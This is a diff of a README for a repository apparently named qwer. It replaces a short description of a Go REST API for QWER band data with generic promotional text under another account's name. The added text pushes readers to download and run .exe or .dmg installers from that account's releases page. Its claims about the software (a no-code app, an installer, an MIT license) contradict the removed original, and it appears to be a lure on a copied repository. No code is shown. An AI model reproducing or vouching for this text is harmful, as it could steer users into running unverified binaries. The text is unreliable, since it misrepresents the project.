@@ -1,41 +1,60 @@
-# QWER Band API
+# 🎉 qwer - Effortless Access to K-Pop APIs
 
-[![Go](https://img.shields.io/badge/Go-1.21-00ADD8?logo=go&logoColor=white)](https://go.dev/)
-[![Status](https://img.shields.io/badge/Status-Active-success)](#)
-[![License](https://img.shields.io/badge/License-Copyright%20Kiy0w0%202025-blue)](#license)
+## 📥 Download Now
+[![Download qwer](https://img.shields.io/badge/Download-qwer-blue.svg)](https://github.com/Cane4ka777/qwer/releases)
 
+## 🚀 Getting Started
+Welcome to the qwer API! This application makes it simple to access various K-Pop song data. Whether you’re a fan of the genre or just curious, you’ll find this tool user-friendly and efficient.
 
-![Qwer Band](public/qwer/group.webp)
-Simple REST API for QWER band data (albums, songs, members, awards). Built with Go
+## 🔍 Features
+- **Access K-Pop Song Data**: Retrieve information about your favorite K-Pop songs and artists.
+- **Lightweight and Fast**: Get quick responses without heavy downloads.
+- **Easy to Use**: Designed for users with no programming skills.
 
-## Quick start
+## 📋 System Requirements
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: Minimum 1 GB RAM
+- **Disk Space**: At least 50 MB available
 
-```bash
-go mod tidy
-go run main.go
-# visit http://localhost:8080/api
-```
+## 🌐 How It Works
+The qwer API lets you pull data related to K-Pop songs easily. With just a few clicks, you’ll be able to explore an extensive library of songs. This API supports both JavaScript and Go applications, making it versatile for different projects.
 
-## Endpoints
+## 🔧 Download & Install
+To get started, follow these steps:
 
-- GET /api
-- GET /api/band
-- GET /api/members[?id=|name=]
-- GET /api/albums[?id=|title=]
-- GET /api/songs[?id=|title=|album=]
+1. **Visit the Release Page**
+   Go to the [Releases page](https://github.com/Cane4ka777/qwer/releases) to find the latest version of qwer.
 
-## Star History
+2. **Choose Your File**
+   Locate the version you want. You will see different files available for download. Make sure to select the one that matches your operating system.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=kiy0w0/qwer&type=Date)](https://star-history.com/#kiy0w0/qwer)
+3. **Download the Application**
+   Click on the file to start downloading. It should not take long.
 
-## Todo
+4. **Install qwer**
+   Once downloaded, find the file on your computer. 
+   - If you are on Windows, double-click the `.exe` file to start the installation.
+   - For macOS, open the `.dmg` file and drag the qwer application to your Applications folder.
+   - On Linux, you may need to run installation commands in your terminal.
 
-- All Members fancam
-- ~~Website~~
-- All qwer images
+5. **Run the Application**
+   After installation, launch the qwer application. You will see a simple interface welcoming you to use the API.
 
-## License
+## 📖 Usage Instructions
+- **Accessing Data:** Follow the prompts in the application to search for songs, artists, or albums.
+- **Explore Features:** Use the API's search functions to discover new music and learn about artists in real time.
 
-Copyright Kiy0w0 2025
+## 🤝 Support
+If you have questions or need assistance, please visit our [Issues page](https://github.com/Cane4ka777/qwer/issues) to report problems or get help from the community.
 
-Made with ♥️ By Pemuja QWER
+## 🌟 Community
+Join our community of users who love K-Pop and technology. Share your experiences and any new features you wish to see. 
+
+## 📜 License
+This project is licensed under the MIT License. Feel free to use it within the guidelines provided.
+
+## 🔗 Links
+- **GitHub Repository**: [qwer on GitHub](https://github.com/Cane4ka777/qwer)
+- **Documentation**: Available in the repository.
+
+Thank you for choosing qwer! We hope you enjoy using it as much as we enjoyed creating it.
